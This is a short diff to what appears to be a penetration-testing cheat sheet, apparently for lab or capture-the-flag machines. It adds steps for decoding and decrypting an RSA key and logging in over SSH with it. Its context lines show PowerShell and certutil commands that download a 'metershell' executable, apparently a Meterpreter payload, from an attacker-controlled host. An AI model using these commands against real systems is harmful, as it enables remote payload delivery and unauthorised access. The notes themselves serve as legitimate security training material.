@@ -626,11 +626,16 @@ Download a file:
 powershell "(new-object System.Net.WebClient).Downloadfile('http://10.10.14.31:8000/metershell3.exe', 'metershell3.exe')"
 certutil -urlcache -f URL-link/file.txt file.txt
 
-g.) RSA Key - encrypted where hype_key is the key name
+g.) RSA Key - 
+
+i.) encrypted where hype_key is the key name
 cat hype_key | xxd -r -p
 cat hype_key | xxd -r -p >> hype_key_encrypted
 openssl rsa -in hype_key_encrypted -out hype_key_decrypted
 ssh -o PubkeyAcceptedKeyTypes=ssh-rsa -i hype_key_decrypted hype@$IP
+
+ii.) RSA Key - always set permission in order to use it.
+chmod 400 RSA_KEY_NAME
 
 =====================================================================
 		6.) Priv Escalation
